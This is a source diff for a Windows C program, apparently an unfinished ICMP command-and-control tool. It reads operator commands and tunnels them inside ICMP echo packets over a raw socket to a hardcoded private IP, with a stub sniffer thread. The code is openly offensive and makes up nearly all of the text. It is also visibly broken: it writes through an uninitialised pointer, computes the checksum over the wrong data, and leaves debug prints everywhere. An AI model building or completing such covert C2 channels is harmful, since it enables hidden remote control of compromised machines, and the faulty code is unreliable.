@@ -1,12 +1,12 @@
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <stdio.h>
 #include <stdbool.h>
 #include <stdint.h>
 #include <ws2tcpip.h>
 
 #define ICMP_ID 13170
-#define PACKET_LENGTH 4096 // Unsure
+#define DEST_ADDR "192.168.147.109"     
 
 struct sockaddr_in dest_addr;
 struct sockaddr_in source_addr;
@@ -19,10 +19,13 @@ struct icmp_hdr {
     uint16_t seq;
 };
 
-/*
+struct icmp_packet {
+    struct icmp_hdr icmp_header;
+    char* payload;
+};
+
 struct ip_hdr {
-    unsigned int version;
-    unsigned int ihl;
+    uint8_t version_ihl;
     uint8_t tos;
     uint16_t tot_len;
     uint16_t id;
@@ -33,10 +36,11 @@ struct ip_hdr {
     uint32_t saddr;
     uint32_t daddr;
 };
-*/
+
 
 unsigned short icmp_checksum(unsigned short *addr, int len)
 {
+    printf("hi\n");
     int nleft = len;
     int sum = 0;
     unsigned short *w = addr;
@@ -49,6 +53,7 @@ unsigned short icmp_checksum(unsigned short *addr, int len)
      */
 
     while(nleft > 1) {
+        printf("Sum:%ld", sum);
         sum += *w++;
         nleft -= 2;
     }
@@ -61,50 +66,11 @@ unsigned short icmp_checksum(unsigned short *addr, int len)
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     answer = ~sum;
+    printf("ICMP checksum:%hu\n", answer);
     return answer;
 }
 
-int frame_icmp_echo_header(int pack_no)
-{
-    int packsize;
-    struct icmp *icmp;
-    struct timeval *tval;
 
-    /* ICMP Header structure */
-    icmp = (struct icmp*)sendpacket;
-    /* ICMP echo TYPE */
-    icmp->type = ICMP_ECHO;   // 8 : Echo Request
-    icmp->code = 0;  // 0 = net unreachable
-    icmp->checksum = 0;
-    icmp->id = pid;
-    icmp->seq = pack_no;
-    packsize = 8 + ICMP_DATA_LEN;  // 8 + 56 (data) = 64 Bytes ICMP header
-    tval = (struct timeval *)icmp -> icmp_data;
-    gettimeofday(tval, NULL);
-    /* Calculate checksum */ 
-    icmp->icmp_cksum = icmp_checksum( (unsigned short *)icmp, packsize);
-    return packsize;
-}
-
-void send_icmp_echo_packet()
-{
-    int packetsize;
-
-    nsend++;
-    /* ICMP EHCO PACKET HEADER */
-    packetsize = frame_icmp_echo_header(nsend);
-
-    /* Send the ICMP packet to the destination Address */
-    if( sendto(sockfd, sendpacket, packetsize, 0,
-                (struct sockaddr *)&dest_addr, sizeof(dest_addr) ) < 0  ) {
-        perror("sendto error");
-        nsend--;
-    }
-    sleep(1);
-}
-
-
- \
 bool send_icmp_packet(int socket, char *icmp_shell, int packet_seq) {
     /*
     size_t packet_size = sizeof(struct ip_hdr) + sizeof(struct icmp_hdr) + sizeof(payload);
@@ -126,25 +92,33 @@ bool send_icmp_packet(int socket, char *icmp_shell, int packet_seq) {
     ip->daddr;
     */
 
-    char *packet = malloc(sizeof(struct icmp_hdr*) + sizeof(icmp_shell));
+/*
+    char *packet = malloc(sizeof(struct icmp_hdr) + strlen(icmp_shell));
     struct icmp_hdr *icmp = (struct imcp_hdr*) (packet); 
     char *payload = (char *) (packet + sizeof(struct icmp_hdr));
+*/
 
-    icmp->type = 8;
-    icmp->code = 0;
-    icmp->checksum; // TBD 
-    icmp->seq = packet_seq;
-    icmp->id = ICMP_ID;
+    struct icmp_packet *packet;
+    memset(packet, 0, sizeof(struct icmp_packet));
+    packet->icmp_header.type = 8;
+    packet->icmp_header.code = 0;
+    packet->icmp_header.seq = packet_seq;
+    packet->icmp_header.id = ICMP_ID;
+    packet->payload = malloc(strlen(icmp_shell));
+    memcpy(packet->payload, icmp_shell, strlen(icmp_shell));
+    printf("a\n");
+    packet->icmp_header.checksum = icmp_checksum((unsigned short *)packet, sizeof(struct icmp_hdr) + strlen(packet->payload)); // TBD 
+    printf("aa\n");
+    //printf("Size: %ld\n", str));
 
-    strcpy(payload, icmp_shell);
-
-    if( sendto(socket, packet, sizeof(struct icmp_hdr*) + sizeof(icmp_shell), 0,
-                (struct sockaddr *)&dest_addr, sizeof(dest_addr) ) < 0  ) {
-        perror("Sendto error");
-        return false;
-    }
-    sleep(1);
-    return true;
+    int result = sendto(socket, (char *)packet, sizeof(struct icmp_hdr) + strlen(packet->payload), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); 
+    if (result < 0) {
+    printf("Error: %ld\n", GetLastError());
+    }  
+    printf("Payload: %s\n", packet->payload);
+    printf("Packet: %s\n", (char *)packet);
+    //sleep(1);
+    return true; 
 }
 
 
@@ -153,28 +127,41 @@ DWORD WINAPI IcmpSniffer(LPVOID lpParam) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    WSADATA ver;
+    WSAStartup(MAKEWORD(2,2), &ver);
 
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    bzero(&dest_addr, sizeof(dest_addr));
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_addr.s_addr = inet_addr(DEST_ADDR);
+
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); 
     if (sock < 0) {
-        perror("socket() failed");
+        printf("Error: %ld\n", GetLastError());
         exit(EXIT_FAILURE);
     }
+
+    //int on = 1;
+    //setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
 
     HANDLE hThread = CreateThread(NULL, 0, IcmpSniffer, NULL, 0, NULL);
 
     char icmp_shell[100];
-    char exit_string = "exit";
+    char exit_string[] = "exit\n";
     int packet_seq = 0;
     while (true) {
+        printf("A\n");
         fgets(icmp_shell, sizeof(icmp_shell), stdin);
+        printf("%s\n", icmp_shell);
         if (strcmp(icmp_shell, exit_string) == 0) {
-            printf("[+]Stopping ICMP C2...");
+            printf("[+]Stopping ICMP C2...\n");
             WaitForSingleObject(hThread, 1);
             CloseHandle(hThread);
-        } else if (strcmp(icmp_shell, "") == 0) {
+            break;
+        } else if (strcmp(icmp_shell, "\n") == 0) {
             continue;
         } else {
-            if (send_icmp_packet(icmp_shell,)) {
+            printf("B\n");
+            if (send_icmp_packet(sock, icmp_shell, packet_seq)) {
                 packet_seq++;
             }
             // Send ICMP packet as payload
